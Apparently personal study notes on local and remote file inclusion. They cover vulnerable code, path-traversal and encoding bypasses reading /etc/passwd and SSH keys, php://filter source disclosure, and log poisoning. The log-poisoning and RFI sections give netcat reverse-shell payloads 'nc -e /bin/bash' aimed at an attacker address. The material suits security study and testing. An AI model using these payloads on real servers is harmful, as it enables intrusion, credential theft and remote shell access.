---
title: Notes | LFI
author: Zeropio
date: 2022-04-23
categories: [Notes, Vulnerabilities]
tags: [lfi]
permalink: /notes/vulnerabilities/lfi
---


# Local file inclusion
**LFI** is the process to include files locate in the server through the exploiting of vulnerable inclusion. The most common place we usually find LFI within is templating engines, for example `/index.php?page=about`. Where `index.php` sets static content and the parameter `page` dinamically. LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions.

Some examples of insecure code:
- PHP 

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

- NodeJS 

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

- Express.js 

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

- Java 

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

- .NET 

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```
```cs
@Html.Partial(HttpContext.Request.Query['language'])
```
```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

## Read vs Execute

There are a difference in these functions between read and execute. Some of the above functions **only read** the content of the specified files, while others also **execute** the specified files:

| **Function**    | **Read content**   | **Execute**    | **Remote URL** |
|---------------- | --------------- | --------------- | -------------- |
| **PHP** |     
| `include()`/`include_once()` | ✅| ✅| ✅| 
| `require()`/`require_once()` | ✅| ✅ | ⬜️|
| `file_get_contents()` | ✅ | ⬜️ | ✅ |
| `fopen()`/`file()` | ✅ | ⬜️ | ⬜️ |
| **NodeJS** |			
| `fs.readFile()` |	✅ |	⬜️ |	⬜️ |
| `fs.sendFile()` |	✅ |	⬜️ | 	⬜️ |
| `res.render()` | 	✅ | 	✅ |	⬜️ |
| **Java** |			
| `include` |	✅ |	⬜️ | 	⬜️ |
| `import` |	✅ |	✅ |	✅ |
| **.NET** |			
| `@Html.Partial()` |	✅ | 	⬜️ | 	⬜️ |
| `@Html.RemotePartial()` |	✅ | 	⬜️ |	✅ |
| `Response.WriteFile()` |	✅ |	⬜️ |	⬜️ |
| `include` |	✅ |	✅ |	✅ |

## Basic LFI

Taking the last example, a page that allow to change language can be seen as: `http://<ip>/index.php?language=es.php`

We can try a direct LFI to see other files.
```
http://<ip>/index.php?language=/etc/passwd
``` 

## Path Traversal 

The example was using an **absolute path**, this could work with a code like:
```php
include($_GET['language']);
```

But if the code has some type of restriction as:
```php
include("./languages/" . $_GET['language']);
```

In this case, the path will be `./languages//etc/passwd`, leading to an error. So we need to try with **relative path**. In Windows and Linux `..` means one folder back. We can try with: 
```
http://<ip>/index.php?language=../../../etc/passwd
```

## Filename Prefix 

If the code simply add the prefix:
```php
include("lang_" . $_GET['language']);
```

Our last example will be `lang_../../../etc/passwd`. We need to break it: 
```
http://<ip>/index.php?language=/../../../etc/passwd
```

The final output will be `lang_/../../../etc/passwd`

> Maybe `lang_/` don't exist and the page break instead of showing the file.
{: .prompt-warning }

a


## Second-Order Attacks 

In some cases, we can use variables inside the web to provoke a LFI. It is called *Secon-Order* because we infect a service (for example a database), and other (like the web) perform the attack.

For example, if our profile picture is from `/profile/$username/avatar.png`{: .filepath}, we can change our username to `../../../etc/passwd`.

## Basic Bypasses

### Non-Recursive Path Traversal Filters 

One common filter is to replace some strings (like `../`):
```php
$language = str_replace('../', '', $_GET['language']);
```

It is easily broken:
```
http://<ip>/index.php?language=....//....//....//....//etc/passwd
```

There are more types, for example `..././`, `....\/`, `....////`,...

### Encoding 

One basic bypass is to encode it. The string `../` in ASCII is `%2e%2e%2f`. We can encode all the string, or maybe only a part:
```
http://<ip>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Also, we can double encode it.

### Approved Paths 

Some webs uses **regular expressions** to ensure that we are in their path:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

We will need to get the approved path, via fuzzing, checking the request or trial-error. Once we get it:
```
http://<ip>/index.php?language=./languages/../../../../etc/passwd
```

### Appended Extensions 

In some cases, the extension can be added to our input:
```php
include($_GET['language'] . ".php");
```

So our input will be `/etc/passwd.php`. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension.

#### Path Truncation
In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. First we need to start with a non-existing path. 

With a bash script we can easily reach 4096 characters:
```console
zero@pio$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

And then copy and paste in the url.
```
http://<ip>/index.php?language=non_existing_directory/../../../etc/passwd/././...
```

We need to calculate where it will truncate, to remove only `.php` and not the rest of our string.

#### Null Bytes 

PHP versions before 5.5 were vulnerable to **null byte injection**, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it.

As simple as using `/etc/passwd%00`, the final string would be `/etc/passwd%00.php`. Anything after the null byte will be truncated.

## PHP Filters 

[PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) are a useful tool to test more options.

### Input Filters

[PHP Filters](https://www.php.net/manual/en/filters.php) are one of the PHP wrappers types. To use a wrapper we need to type `php://`, and the filters `php://filter/`.
We will use to parameter: **resource** and **read**. There are four types for filter:
- [String Filters](https://www.php.net/manual/en/filters.string.php)
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)

### Fuzzing for PHP Files

We will start fuzzing:
```console
zero@pio$ ffuf -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>/FUZZ.php
```

### Source Code Disclosure 

Once we have a list of php files, we can start trying to read it. Let's take a `config.php` file:
```url
php://filter/read=convert.base64-encode/resource=config
```
```url
http://<ip>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```





We can check some important files:
- **/home/user/.ssh/id_rsa ->** check credentials for a ssh connection, with **ssh2john** we can break any ssh password if its weak or we have it in a dictionary.
- **/proc/sched_debug ->**  show many running scripts
- **/proc/net/fib_trie ->** check network interfaces (with *grep -i  "host local" -B 1* we can get local ip).
- **/proc/net/tcp ->** check port. The last four digits from the second column (rem_address), if we add a **0x** in Python before we can get the port (its common to not get ports like 80 here).


#### Wrappers
Help to escape LFI sanitazer. For example:
- **?file=file:///etc/passwd ->** get the file.
- **?file=php:///filter/convert.base64-encode/resource=file.php ->** give all the content file (including comments) in base64 (useful to get the whole source code).

###  Log Poisoning
Change logs in order to recreate a RCE.

#### Reverse Shell
We can execute code accesing **/proc/self/environ**. We can modify the header in burpsuite to add:
```php
<?passthru('nc -e /bin/bash <ip> <port>');?>
```
To execute the reverse shell.

#### Apache2
In **/var/log/apache2/access.log** we can manipulate the user agent that the log is currently saving in the logs with curl. For example:
```console
> curl -s -H "User-Agent: <¿php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/apache2/access.log"
```
Now we can execute code in the system.

Also, we can try to login (for example with ssh). **auth.log** will save the login attempt, if we execute the page after the login we will execute the script.
##### Maybe we need to encode the payload to base64

Another example is the **/var/log/auth.log**. We can try to log in by ssh with and invalid user and see that all the trys are been saving in the log.
If we log as a command, execute the log (loading with curl or in the web with LFI) we can execute the command and get a **reverse shell**:
- First we encode the connection (with netcat).
```console
> echo 'nc -e /bin/bash 127.0.0.1:443' | base64; echo
  bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMTo0NDMK
```
- Then we send this "user" to the log:
```console
> ssh '<¿php system("echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMTo0NDMK | base64 -d | bash"); ?>'@127.0.0.1 
```
Then we will try to log in with any password. Now we just need to reload the log in the web, then the code is executed.
```console
> curl -s -H "User-Agent: <¿php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/auth.log"
```


# Remote File Inclusion (RFI)
Load files into the server.

We can create a plain file (**.txt**) with a php content:
```php
<?php
  passthru('nc -e /bin/sh 192.168.1.134 9000');
?>
```

Then we change the url with:
```
...?index=http://<ip>/revershell.txt
```
And then we can execute code.
